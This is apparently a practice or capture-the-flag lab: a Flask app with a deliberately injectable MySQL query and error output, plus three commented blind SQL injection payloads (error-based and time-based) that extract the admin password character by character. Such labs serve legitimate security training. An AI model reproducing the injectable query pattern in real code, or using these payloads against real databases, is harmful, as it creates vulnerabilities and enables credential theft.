import os
from flask import Flask, request
from flask_mysqldb import MySQL

app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'users')
mysql = MySQL(app)

template ='''
<pre style="font-size:200%">SELECT * FROM user WHERE uid='{uid}';</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
'''

@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid')
    if uid:
        try:
            cur = mysql.connection.cursor()
            cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
            return template.format(uid=uid)
        except Exception as e:
            return str(e)
    else:
        return template


if __name__ == '__main__':
    app.run(host='0.0.0.0')

# ''or ((select if((select substr((select upw from user where uid='admin'), 1, 1)) > CHAR(0), 1, 0))  OR (select 9e307*2));--

# 'or ((select if((select substr((select upw from user where uid='admin'), 1, 1)) > CHAR(80), 1, 0))  AND (SLEEP(5)));--

# ((select if((select bin(ord(substr((select upw from user where uid='admin'), 1, 1)))) = 1, 1, 0)) AND (SLEEP(5)));--